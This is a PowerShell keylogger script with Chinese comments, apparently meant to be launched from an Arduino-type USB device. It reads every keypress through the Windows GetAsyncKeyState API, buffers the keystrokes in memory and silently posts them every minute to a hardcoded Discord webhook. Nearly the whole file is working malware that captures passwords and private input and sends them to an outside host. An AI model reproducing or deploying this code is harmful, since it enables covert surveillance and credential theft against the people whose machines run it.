# -------------------------------------------------------------------------
# GitHub 檔案名稱: keylogger.ps1 (或您在 Arduino 中說明的名稱)
# 描述: 記憶體內駐留 Keylogger，非同步發送至 Discord
# -------------------------------------------------------------------------

# ================= 配置區域 =================
$WebhookUrl = "https://discord.com/api/webhooks/1472107208023081128/RfuzPLMYCYA8XXwTaMQUcWg_VU_TULRl6Lh_sJm1LJW-MyMEDh-ThCZW-_iH-ZD8B77K" # 務必替換為真實網址
$DumpIntervalSeconds = 60         # 每 60 秒發送一次
$MaxBufferSize = 500             # 記憶體快取達到 500 字元時強制發送
# ===========================================

# 基礎環境檢查
if (-not $WebhookUrl.StartsWith("https://discord.com/api/webhooks/")) {
    Write-Error "無效的 Discord Webhook 網址。"
    exit
}

# 定義 C# API 調用（用於讀取鍵盤狀態）
$APISignature = @'
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);
'@
$Win32API = Add-Type -MemberDefinition $APISignature -Name "Win32Utils" -Namespace Win32 -PassThru

# 初始化記憶體緩衝區
$KeysBuffer = New-Object System.Text.StringBuilder

# 定義 Discord 發送函式
function Send-DiscordPayload {
    param ([string]$Content)
    if ([string]::IsNullOrWhiteSpace($Content)) { return }

    # 防止訊息過長（Discord 限制 2000 字元）
    $SafeContent = if ($Content.Length -gt 1900) { $Content.Substring(0, 1900) + "... (truncated)" } else { $Content }
    
    $Payload = @{
        content = "**Keylog Report** - 時間: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n```text`n$SafeContent`n```"
    } | ConvertTo-Json -Compress

    try {
        # 使用非同步方式發送，避免阻塞 Keylogger 記錄
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Payload)
        $request = [System.Net.WebRequest]::Create($WebhookUrl)
        $request.Method = "POST"
        $request.ContentType = "application/json"
        $request.ContentLength = $bytes.Length
        
        $requestStream = $request.GetRequestStream()
        $requestStream.Write($bytes, 0, $bytes.Length)
        $requestStream.Close()
        
        # 不等待回應，直接結束函式
    } catch {
        # 靜默失敗
    }
}

# 主迴圈：持續監聽鍵盤
$LastDumpTime = Get-Date
$Running = $true

while ($Running) {
    # 掃描標準按鍵 (ASCII 8 到 254)
    for ($vk = 8; $vk -le 254; $vk++) {
        $state = $Win32API::GetAsyncKeyState($vk)
        
        # 判斷按鍵是否被按下 (最顯著位元為 1)
        if (($state -band 0x8000) -eq 0x8000) {
            $char = [char]$vk
            $keyName = $char.ToString()

            # 特殊按鍵處理（可根據需要增加）
            switch ($vk) {
                8   { $keyName = "[BACKSPACE]" }
                9   { $keyName = "[TAB]" }
                13  { $keyName = "[ENTER]`n" }
                16  { $keyName = "[SHIFT]" }
                17  { $keyName = "[CTRL]" }
                18  { $keyName = "[ALT]" }
                20  { $keyName = "[CAPSLOCK]" }
                27  { $keyName = "[ESC]" }
                32  { $keyName = " " } # 確保空白鍵正常顯示
                46  { $keyName = "[DEL]" }
                160 { $keyName = "[LSHIFT]" }
                161 { $keyName = "[RSHIFT]" }
            }

            # 寫入記憶體緩衝區
            [void]$KeysBuffer.Append($keyName)
        }
    }

    # 發送檢查
    $currentTime = Get-Date
    $timeDiff = ($currentTime - $LastDumpTime).TotalSeconds
    
    if ($timeDiff -gt $DumpIntervalSeconds -or $KeysBuffer.Length -gt $MaxBufferSize) {
        $ContentToSend = $KeysBuffer.ToString()
        $KeysBuffer.Clear()
        
        # 呼叫非同步發送
        Send-DiscordPayload -Content $ContentToSend
        $LastDumpTime = $currentTime
    }

    # 降低 CPU 負載
    Start-Sleep -Milliseconds 10
}

